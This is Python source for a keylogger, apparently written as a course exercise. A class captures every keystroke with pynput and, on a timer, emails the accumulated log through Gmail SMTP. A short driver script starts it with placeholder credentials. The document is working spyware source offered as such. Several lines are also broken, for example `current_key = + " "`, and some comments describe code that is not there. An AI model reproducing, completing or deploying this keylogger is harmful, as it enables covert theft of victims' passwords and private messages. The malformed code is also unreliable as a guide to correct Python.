#!/usr/bin/env python
import pynput.keyboard
import threading
import smtplib

class Keylogger: #blueprint for code to make it more readable
    def __init__(self, time_interval, email, password): #code put in the init will be automatically executed when object is created 
        self.log = "Keylogger started" #empty log that will populate when user enters keys. self makes variable usable in current key logger class
        self.interval = time_interval #value set in doomlogger.py will be used throughour entire code
        self.email = email
        self.password = password

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        try: #regular keys
            current_key = str(key) #log = whatever is in the log + whatever the user enters. key.char lets us see each character
        except AttributeError: #lets special keys work 
            if key == key.space:
                current_key = + " "
            else:
                current_key = + current_key.strip() #puts space after character
        self.append_to_log(current_key.strip("'") + " ")

    def report(self): #calling report fuction on itself
        self.send_mail(self.email, self.password, "\n\n" + self.log) #skip header. email placed in content of message
        self.log = "" #print empty log
        timer = threading.Timer(self.interval, self.report) #timer will run on a seperate thread. Thread will allow log and listener to work at the same time.
        timer.start() #when run, timer will wait x seconds and call report again 

    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587) #gmail
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press) #creating keyboard listener
        with keyboard_listener:
            self.report() #before we start listener calling our report. 
            keyboard_listener.join()

            
#!/usr/bin/env python
import keylogger

my_keylogger = keylogger.Keylogger(10, "username", "password") #creating object and storing it in a variable called key_logger
my_keylogger.start()
